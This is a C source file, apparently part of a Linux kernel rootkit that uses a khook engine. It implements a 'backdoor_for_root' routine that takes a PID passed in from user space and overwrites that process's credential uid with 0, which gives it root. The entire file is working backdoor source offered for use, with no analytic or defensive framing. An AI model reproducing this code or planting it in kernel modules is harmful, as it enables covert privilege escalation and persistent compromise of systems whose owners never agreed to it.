#include "../khook/engine.h"
#include "backdoor_for_root.h"
#include "../protocol.h"

#include <linux/uaccess.h> // copy_from_user
#include <linux/pid.h> // find_get_pid, put_pid, get_pid_task
#include <linux/sched.h> // find_task_by_vpid
#include <linux/sched/task.h> // put_task_struct
#include <linux/cred.h> // copy_creds, exit_creds
#include <linux/slab.h> // kmalloc, kfree
#include <linux/stat.h> // struct kstat

static int backdoor_for_root(unsigned int pid){
    rcu_read_lock();
    struct pid *pid_pointer = find_get_pid(pid);
    if (pid_pointer == NULL) {
        goto err;
    }
    struct task_struct *pid_task = get_pid_task(pid_pointer, PIDTYPE_PID);
    if (pid_task == NULL) {
        goto err;
    }

    struct cred *tcred = get_task_cred(pid_task);
    if (tcred == NULL) {
        goto err;
    }
    tcred->uid.val = 0;
    put_cred(tcred);
    put_task_struct(pid_task);
    put_pid(pid_pointer);
    rcu_read_unlock();
    return 0;

    err:
    if (pid_pointer != NULL) {
        put_pid(pid_pointer);
    }
    rcu_read_unlock();
    return 1;
}


int handle_backdoor_root_request(void *raw_subargs) {
    struct BackdoorForRootSubargs subargs;
    if (copy_from_user(&subargs, (void *)raw_subargs, sizeof(struct BackdoorForRootSubargs)) != 0) {
        // copy failed
        goto err;
    }
    if (backdoor_for_root(subargs.pid) != 0) {
        // backdoor root failed
        goto err;
    }
    return 0;

    err:
    return 1;
}
